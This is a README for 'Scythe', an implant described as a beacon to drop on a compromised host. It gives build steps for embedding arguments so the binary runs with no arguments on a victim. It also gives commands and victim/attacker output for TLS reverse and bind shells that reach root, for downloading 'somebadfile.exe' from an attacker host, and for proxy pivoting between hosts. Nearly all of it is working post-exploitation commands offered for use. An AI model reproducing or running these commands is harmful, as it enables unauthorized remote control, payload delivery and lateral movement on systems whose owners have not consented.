# Scythe
All in one beacon to drop on a compromised host


## Build

* Please look at github actions or just use the dockerfile to build for your platform.

### Embedded arguments

You can compile subcommand and flags into the binary so it runs with **no command-line arguments** (e.g. `./Scythe.embedded` only). The same tokens are used as after the program name today: a JSON array of strings.

**Using the helper script** (from the repo root):

```bash
./scripts/build-embedded.sh '["Http","-url","https://example.com/api","-timeout","30s"]' ./Scythe.embedded
./scripts/build-embedded.sh '["Netcat","-reverse","-address","10.0.0.1","-port","4444","-tls"]'
```

Default output is `./Scythe.embedded` if you omit the second argument.

**Generating JSON safely (recommended for real invocations):** hand-written JSON breaks easily when `-headers` or other values contain commas, spaces, or quotes. Build the same token list you would pass on the CLI, serialize with Python, then pass the result to the script (the script base64-encodes it for `-ldflags`; you do not need to run `base64` yourself).

One-liner (short example):

```bash
JSON=$(python3 -c 'import json; print(json.dumps(["Http","-timeout","5s","-url","http://127.0.0.1:8080","-headers","Content-Type:application/json,X-Client-Id:abc"]))'
./scripts/build-embedded.sh "$JSON" ./Scythe.embedded
```

Long values (e.g. full `User-Agent`, multiple headers): use a small heredoc so the strings stay readable:

```bash
JSON=$(python3 <<'PY'
import json
print(json.dumps([
    "Http",
    "-timeout", "5s",
    "-url", "http://10.0.0.1:8080",
    "-directories", "/heartbeat,/heartbeat/uuid-here",
    "-headers",
    "Content-Type:application/json,X-Client-Id:...,X-API-Secret:...,User-Agent:Mozilla/5.0 ...",
]))
PY
)
./scripts/build-embedded.sh "$JSON" ./Scythe.embedded
```

**Network subcommands (Netcat, FileTransfer, Proxy):** same idea—embed the exact token list you would pass after `./Scythe` (addresses, ports, `-tls`, `-proxy`, etc.). Use Python whenever a value is awkward to quote in JSON.

Helper script (inline JSON):

```bash
./scripts/build-embedded.sh '["Proxy","-port","9050"]' ./Scythe.embedded
./scripts/build-embedded.sh '["Netcat","-reverse","-address","10.0.0.1","-port","4444","-tls"]' ./Scythe.embedded
./scripts/build-embedded.sh '["FileTransfer","-listen","-port","8080","-filename","payload.bin","-tls"]' ./Scythe.embedded
```

One-liner (Netcat reverse with SOCKS5):

```bash
JSON=$(python3 -c 'import json; print(json.dumps(["Netcat","-reverse","-address","10.10.10.10","-port","8000","-proxy","127.0.0.1:9050","-tls"]))'
./scripts/build-embedded.sh "$JSON" ./Scythe.embedded
```

Longer network argv (paths, hostnames, proxy): heredoc keeps flags readable:

```bash
JSON=$(python3 <<'PY'
import json
print(json.dumps([
    "FileTransfer",
    "-download",
    "-filename", "somebadfile.exe",
    "-hostname", "10.10.10.10",
    "-port", "8080",
    "-proxy", "172.17.0.2:1080",
    "-tls",
]))
PY
)
./scripts/build-embedded.sh "$JSON" ./Scythe.embedded
```

**Manual `go build`:** take the same `JSON` variable as above (Http or network), then base64 (no newlines) and link:

```bash
JSON=$(python3 -c 'import json; print(json.dumps(["Http","-url","https://example.com","-timeout","30s"]))')
B64=$(printf '%s' "$JSON" | base64 | tr -d '\n')
go build -trimpath \
  -ldflags "-X github.com/BuildAndDestroy/Scythe/pkg/userinput.EmbeddedArgv=${B64}" \
  -o Scythe.embedded ./cmd
```

**Runtime:** run the binary with no extra arguments to use the embedded argv. If you invoke it with any arguments (e.g. `./Scythe.embedded Http -url …`), those are used instead and embedded defaults are ignored.

## Netcat

Remember to use --proxy if you plan to pivot between hosts

### Reverse Shell

* Victim:

```
root@f44b79805a1e:~/cmd# ./ScytheLinux Netcat --address 172.17.0.2 --reverse --port 8000 --tls
2024/06/13 22:45:18 [*] Rev shell spawning, connecting to 172.17.0.2:8000
2024/06/13 22:45:18 Linux

```

* Attacker:

```
root@fcbc11f4beba:~/cmd# ./ScytheLinux Netcat --listen --port 8000 --tls 
2024/06/13 22:45:06 Listener opened on :8000
2024/06/13 22:45:09 Received connection from 172.17.0.3:57398!
whoami
root

```

### Bind Shell:

* Victim:

```
root@fcbc11f4beba:~/cmd# ./ScytheLinux Netcat --bind --port 8000 --tls
2024/06/13 22:45:57 [*] Binding shell spawning for remote code execution
2024/06/13 22:46:02 Received connection from 172.17.0.3:49050!

```

* Attacker:

```
root@f44b79805a1e:~/cmd# ./ScytheLinux Netcat --address 172.17.0.2 --caller --port 8000 --tls
2024/06/13 22:46:02 [*] Bind shell spawning, connecting to 172.17.0.2:8000
whoami
root

```

## File Transfer

### Download

* Victim

```
./Scythe.exe FileTransfer --download --filename somebadfile.exe --hostname 10.10.10.10 --port 8080 --tls
```

* Attacker

```
./Scythe FileTransfer --listen --port 8080 --tls
```


### Upload

* Attacker

```
./Scythe.exe FileTransfer --filename somebadfile.exe --port 8080 --send --tls
```

* Victim

```
./Scythe.exe FileTransfer --listen --filename somebadfile.exe --port 8080 --tls
```

## Proxy

* Proxy server

```
./Scythe Proxy --port 9050
```

* Victim Reverse Shell

```
./Scythe.exe Netcat --address 10.10.10.10 --reverse --port 8000 --proxy 172.17.0.2 --tls
```

* Attacker

```
./ScytheLinux Netcat --listen --port 8000 --tls
```

## HTTP

### HTTP Test Server

* Use this to test your HTTP requests.

```
virtualenv -p python3 ~/development/virtual_env/flask
source ~/development/virtual_env/flask/bin/activate
pip install flask
python3 -m http.server
```

* Use this command to test different requests
* Spin up a Listener and Proxy if you want to test those features

```
./Scythe Http --method GET --timeout 5s --url http://127.0.0.1:5000 --directories /index.js,/index.html,/first-dir/index.js,/first-dir/index.html,/command.js,/server.py,/first-dir/dir.js/server.py,/requirements.py
```
